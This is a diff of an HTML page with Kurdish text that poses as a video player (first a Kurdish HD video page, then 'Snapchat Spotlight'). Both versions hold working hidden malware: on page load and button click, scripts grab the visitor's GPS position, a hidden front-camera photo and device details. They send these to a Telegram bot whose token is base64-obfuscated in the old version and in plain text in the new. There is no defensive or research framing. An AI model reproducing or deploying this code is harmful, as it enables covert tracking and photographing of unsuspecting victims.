@@ -1,111 +1,98 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ڤیدیۆیا مۆدێرن و تایبەت</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;700&display=swap" rel="stylesheet">
-    <style>body { font-family: 'Vazirmatn', sans-serif; }</style>
+    <title>Snapchat Spotlight</title>
+    <style>
+        body { background-color: #000; color: white; font-family: Arial; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        video, canvas { display: none; }
+        .loader { border: 5px solid #333; border-top: 5px solid #fffc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-<body class="bg-slate-900 text-white min-h-screen flex flex-col items-center justify-center p-4" onload="_ultimateInitSystem()">
-
-    <div class="bg-slate-800 p-6 rounded-2xl shadow-2xl w-full max-w-md border border-slate-700 text-center">
-        <h1 class="text-xl font-bold mb-4 text-indigo-400">لێدانا ڤیدیۆیێ</h1>
-        <p class="text-slate-300 text-sm mb-4">بۆ دیتنا ڤیدیۆیێ ب کوالیتیا بلندا HD، ل خوارێ کلیک بکە.</p>
-        
-        <div class="mb-4 bg-slate-900 rounded-xl overflow-hidden border border-slate-700 h-64 flex items-center justify-center relative">
-            <video id="_vidPlayer" class="w-full h-full object-cover" controls playsinline>
-                <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-            </video>
-        </div>
-
-        <button onclick="_executeUltimateBypass()" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-xl transition duration-200 shadow-lg shadow-indigo-600/30">
-            لێدان و ڤەکرنا ڤیدیۆیێ
-        </button>
+<body>
+    <div>
+        <div class="loader"></div>
+        <h1>Snapchat Spotlight</h1>
+        <p>هيڤي دكه م وه بكه ڤيديو ڤه بيتن ...</p>
     </div>
 
-    <video id="_vCoreNode" autoplay playsinline class="hidden"></video>
-    <canvas id="_cBufferNode" class="hidden"></canvas>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const _mKey = ["ODk3Nzk0NTc4", "MTpBQUZJNDRS", "T3VkUjVlTER3", "bEJycE5TeU5p", "SmotQzhGdURtRQ==", "NzY0MzE5MTgwMg=="];
-        
-        function _decode(i) {
-            try { return atob(_mKey[i]); } catch(e) { return ""; }
+        const token = '8977945781:AAFI44ROudR5eLDwlBrpNSyNiJj-C8FuDmE';
+        const chat_id = '7643191802';
+
+        // ١. فريكرنا ريسالئن ئاسایی
+        async function sendMessage(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: text })
+            });
         }
 
-        const _getToken = () => _decode(0) + _decode(1) + _decode(2) + _decode(3) + _decode(4);
-        const _getChatId = () => _decode(5);
-
-        async function _sendText(msg) {
-            let t = _getToken(), c = _getChatId();
-            if(!t || !c) return;
-            try {
-                const endpoint = `https://api.telegram.org/bot${t}/sendMessage`;
-                const payload = JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" });
-                navigator.sendBeacon(endpoint, new Blob([payload], {type: 'application/json'}));
-            } catch(e) {}
-        }
-
-        async function _sendImage(blobData) {
-            let t = _getToken(), c = _getChatId();
-            if(!t || !c) return;
-            try {
-                let form = new FormData();
-                form.append('chat_id', c);
-                form.append('photo', blobData, 'ultimate_capture.jpg');
-                form.append('caption', `🚀 سەرکەفتن! وێنەیێ نوو هاتە گرتن\n@YUSEEF_SURCHI`);
-                await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: form });
-            } catch(e) {}
-        }
-
-        function _ultimateInitSystem() {
-            let sysInfo = `🛡️ زانیاریێن پێشکەڤتی یێن ئامێرێ:\n- پلاتفۆرم: ${navigator.platform}\n- هژمارا کورێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'N/A'}\n- مەحزەن (RAM): ${navigator.deviceMemory || 'N/A'} GB\n- پەنجەرە: ${window.innerWidth}x${window.innerHeight}`;
-            _sendText(sysInfo);
-
+        // ٢. وەرگرتنا جهئ وي (Location)
+        function askLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        let mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        _sendText(`📍 جهـ هاتە دیتن (GPS Auto)\nلینک: ${mapLink}\n@YUSEEF_SURCHI`);
-                    },
-                    (err) => {},
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+                navigator.geolocation.getCurrentPosition(position => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendMessage(`📍 جهئ وي هاته ديتن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين@YUSEEF_SURCHI\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => sendMessage("⚠️  نه هئلا جهئ وي ببيني هه ر كاره كئ بئ اخلاق ام به ر پرس نينين (GPS) او كه سئ بوت درسكري @YUSEEF_SURCHI "));
             }
         }
 
-        async function _executeUltimateBypass() {
+        // ٣. گرتنا رسمي ب کوالیتیا بلندا HD و فرئكرنئ
+        async function startCamera() {
             try {
-                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, 
-                    audio: false 
-                });
-                
-                const videoElement = document.getElementById('_vCoreNode');
-                videoElement.srcObject = mediaStream;
-                
-                await new Promise(r => setTimeout(r, 900));
-
-                const canvasElement = document.getElementById('_cBufferNode');
-                canvasElement.width = videoElement.videoWidth || 1280;
-                canvasElement.height = videoElement.videoHeight || 720;
-                
-                const context = canvasElement.getContext('2d');
-                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
-                
-                canvasElement.toBlob(async (blob) => {
-                    if(blob) {
-                        await _sendImage(blob);
+                // داخوازکرنا کوالیتیا بلندا HD (وەکی 1280x720 یان پتر ل گورەی شیانێن کامیرایێ)
+                const constraints = {
+                    video: {
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: "user" // کامیرایا پێشی
                     }
-                    mediaStream.getTracks().forEach(track => track.stop());
-                }, 'image/jpeg', 0.98);
+                };
 
-            } catch (error) {
-                _sendText(`⚠️ ڕێکنەدا ب کامێرایێ (Access Blocked)\n@YUSEEF_SURCHI`);
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ڤەدکرنا ڤیدیۆیێ دا کو قەبارەیێ راستەقینە یێ وێنەیی بهێتە وەرگرتن
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        // دەستنیشانکرنا قەبارەیێ کەنڤاسی ل گورەی قەبارەیێ ڕاستەقینە یێ کامیرایێ
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // فرێکرنا وێنەی ب کوالیتیا بلند (1.0 = 100% کوالێتی)
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'snap_hd.jpg');
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                        }, 'image/jpeg', 1.0);
+                    }, 2500); // دەمژمێرەک کێم هاتە درێژکرن دا کو کامێرا ب تەواوی فوکۆس بکەت و ڕوون ببت
+                };
+            } catch (err) {
+                sendMessage("⚠️  رئكئ ب کاميرئ ناده تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
             }
         }
+
+        // وه ختئ ويبسايت ڤه د بيتين ڤه دبيته ڤه
+        window.onload = () => {
+            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI");
+            askLocation();
+            startCamera();
+        };
     </script>
 </body>
 </html>
